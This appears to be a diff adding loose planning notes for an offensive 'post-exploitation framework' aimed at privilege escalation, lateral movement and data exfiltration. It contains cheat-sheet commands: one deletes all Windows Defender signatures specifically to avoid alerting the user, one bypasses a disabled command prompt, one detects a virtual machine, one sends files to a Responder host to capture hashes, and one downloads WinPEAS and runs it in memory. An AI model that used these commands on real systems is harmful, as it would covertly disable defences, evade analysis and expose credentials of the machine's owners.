@@ -1,0 +1,65 @@
+
+### 3. Post-Exploitation Framework
+
+**Objective:** Create a framework that automates the post-exploitation phase, such as privilege escalation, lateral movement, and data exfiltration.
+
+**Technologies:**
+- Python for scripting and automation.
+- C/C++ for performance-critical tasks like memory manipulation or efficient data processing.
+- PowerShell (PS1) for Windows-specific post-exploitation tasks.
+- Batch for creating simple automation scripts or utilities.
+
+**Tasks:**
+- Use Python's `subprocess` module for executing system commands and `os` module for file and directory manipulation.
+- Implement memory manipulation in C/C++ for tasks like privilege escalation or bypassing security controls.
+- Use PowerShell for automating the execution of Windows-specific post-exploitation tasks.
+- Create batch scripts for simple automation tasks or utilities that can be easily executed by less technical users.
+
+
+
+
+Cripple windows defender by deleting signatures
+"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+Description: 'A bit messy, but if Windows Defender is causing you a big headache, rather than disabling it (which alerts the user), you should just neuter it by deleting all the signatures.'       
+
+Bypass a disabled command prompt with /k
+# Win+R (To bring up Run Box)
+cmd.exe /k "whoami"
+Description: 'This command prompt has been disabled by your administrator...' Can usually be seen in environments such as kiosks PCs, a quick hacky work around is to use /k via the windows run box. This will carry out the command and then show the restriction message, allowing for command execution.
+
+
+
+FOR LOG SYSTEM ADD THESE CHECKS:
+Check if you are in a virtual machine
+reg query HKLM\SYSTEM /s | findstr /S "VirtualBox VBOX VMWare"
+Description: 'Want to know if you are in a Virtual Machine? Query the registry Keys and find out!!! If any results show up then you are in a Virtual Machine.'
+
+Check SMB firewall rules with Responder
+
+Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$"
+Description: 'When I do a Compromise Assessment, I often ask the customer if I can do a last quick check: Copy-Item -Path "C:\tmp\" -Destination "\\<ip_running_responder>\c$". If Responder could capture the hash, the firewall allows outgoing SMB connections'
+
+
+
+
+
+
+incorporate them as extra tools?
+
+nuclei
+Fast vulnerability scanner that uses .yaml templates to search for specific issues.
+
+Install:
+
+go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
+Usage:
+
+cat domains.txt | nuclei -t /PATH/nuclei-templates/
+
+
+WinPEAS
+WinPEAS is a nice verbose privilege escalation for finding local privesc routes on Windows endpoints.
+
+Install + Usage:
+
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
